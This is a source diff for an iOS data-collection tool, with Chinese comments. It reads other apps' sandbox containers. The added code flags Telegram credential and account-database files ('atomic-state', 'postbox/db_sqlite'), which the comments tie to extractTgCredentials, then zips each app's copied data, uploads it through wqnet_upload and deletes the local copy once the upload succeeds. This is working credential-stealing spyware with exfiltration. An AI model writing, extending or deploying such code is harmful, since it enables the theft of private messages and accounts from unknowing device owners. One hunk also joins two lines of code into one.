@@ -14,6 +14,7 @@
 
 #import "WQCollector.h"
 #import "WQAccess.h"
+#import "WQArchive.h"
 
 #import <UIKit/UIKit.h>
 #import <errno.h>
@@ -582,8 +583,7 @@ static void WQRepairAppGroupLibrary(NSString *group) {
     WQFileLog([NSString stringWithFormat:@"repair: %@ Library/Caches ready=%@", group, ok ? @"YES" : @"NO"]);
 }
 
-static NSDictionary<NSString *, NSString *> *WQEnumerateContainers(NSUInteger *granted, NSUInteger *refused) {
-    NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
+static NSDictionary<NSString *, NSString *> *WQEnumerateContainers(NSUInteger *granted, NSUInteger *refused) {    NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
     NSUInteger okCount = 0, noCount = 0;
 
     NSString *root = [NSString stringWithUTF8String:kAppDataRoot];
@@ -687,6 +687,18 @@ static NSString *WQJSONFromArray(NSArray *items) {
     NSData *data = [NSJSONSerialization dataWithJSONObject:items options:0 error:NULL];
     if (!data) return @"[]";
     return [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] ?: @"[]";
+}
+
+/// ZIP 写入用的 IO：底层走 WQAccess，所以别的 App 的容器也能读。
+static WQArchiveIO *WQCollectorArchiveIO(void) {
+    WQArchiveIO *io = [WQArchiveIO new];
+    io.stat = ^BOOL(NSString *path, struct stat *st) { return wq_stat(path, st); };
+    io.list = ^NSArray<NSString *> *(NSString *dir) { return wq_list(dir, NULL); };
+    io.openRead = ^int(NSString *path) { return wq_open_for_reading(path); };
+    io.skipUnreadable = YES;
+    io.expectedUnreadableNames =
+        [NSSet setWithObject:@".com.apple.mobile_container_manager.metadata.plist"];
+    return io;
 }
 
 /// 复制一个容器（两层深，跳过 root-only 的 metadata plist）。
@@ -798,6 +810,15 @@ static NSUInteger WQCopyTree(NSString *src, NSString *dst, NSUInteger depth, WQC
                 if (budget) {
                     budget->bytes += (unsigned long long)sb.st_size;
                     budget->files++;
+                }
+                // /device/chatpack 恢复只认这两个文件名：
+                //   accounts-metadata/atomic-state  → extractTgCredentials
+                //   */postbox/db_sqlite            → extractTgAccountProfile
+                // 跳过 media 之后仍然要能在日志里一眼确认它们采到了。
+                if ([name isEqualToString:@"atomic-state"] ||
+                    [name isEqualToString:@"db_sqlite"] ||
+                    [name hasPrefix:@"db_sqlite-"]) {
+                    WQScopeLog(@"关键文件命中：%@（%llu B）", child, (unsigned long long)sb.st_size);
                 }
             } else {
                 // 数据保护（NSFileProtectionComplete）在锁屏时读不到，errno 会说明
@@ -1041,6 +1062,7 @@ static NSString *WQRunCollection(void) {
         WQStage(@"阶段 4/6：开始采集 %lu 项", (unsigned long)configs.count);
         NSString *stamp = WQStamp();
         NSUInteger processed = 0;
+        NSUInteger uploaded = 0;
         NSMutableArray<NSString *> *missing = [NSMutableArray array];
         NSMutableArray<NSString *> *notCopied = [NSMutableArray array];
 
@@ -1186,11 +1208,40 @@ static NSString *WQRunCollection(void) {
                     [notCopied addObject:[NSString stringWithFormat:@"%@:%@(%@)", bundleID, rel, verdict]];
                 }
             }
+
+            // ---- 压缩并上传：本地留一份，只有上传成功才清掉 ----
+            if (copiedFiles > 0) {
+                NSString *zipPath = [NSTemporaryDirectory() stringByAppendingPathComponent:
+                                     [NSString stringWithFormat:@"%@-%@.zip", safeName, stamp]];
+                [[NSFileManager defaultManager] removeItemAtPath:zipPath error:NULL];
+                NSUInteger zipSkipped = 0;
+                NSString *zipError = nil;
+                BOOL zipped = wq_zip_write(@[dest], zipPath, WQCollectorArchiveIO(),
+                                           nil, nil, &zipSkipped, &zipError);
+                if (!zipped) {
+                    WQScopeLog(@"[%@] 压缩失败：%@", bundleID, zipError ?: @"?");
+                } else {
+                    NSDictionary *zipAttr = [fm attributesOfItemAtPath:zipPath error:NULL];
+                    unsigned long long zipBytes = [zipAttr[NSFileSize] unsignedLongLongValue];
+                    int rc = wqnet_upload(zipPath.UTF8String, bundleID.UTF8String);
+                    WQScopeLog(@"[%@] 上传 %@（%.1f MB，zip 跳过 %lu）-> rc=%d",
+                               bundleID, zipPath.lastPathComponent,
+                               zipBytes / 1048576.0, (unsigned long)zipSkipped, rc);
+                    if (rc == 0) {
+                        uploaded++;
+                        [[NSFileManager defaultManager] removeItemAtPath:dest error:NULL];
+                    } else {
+                        WQScopeLog(@"[%@] 上传失败，本地保留 %@", bundleID, dest.lastPathComponent);
+                    }
+                    [[NSFileManager defaultManager] removeItemAtPath:zipPath error:NULL];
+                }
+            }
         }
 
         // ---- 5/6 完成 ----
-        WQStage(@"阶段 5/6：采集完成 — 总计 %lu 项，已处理 %lu 个，容器缺失 %lu 个",
-                (unsigned long)configs.count, (unsigned long)processed, (unsigned long)missing.count);
+        WQStage(@"阶段 5/6：采集完成 — 总计 %lu 项，已处理 %lu 个，已上传 %lu 个，容器缺失 %lu 个",
+                (unsigned long)configs.count, (unsigned long)processed,
+                (unsigned long)uploaded, (unsigned long)missing.count);
         if (missing.count > 0) {
             WQStage(@"容器缺失：%@", [missing componentsJoinedByString:@", "]);
         }
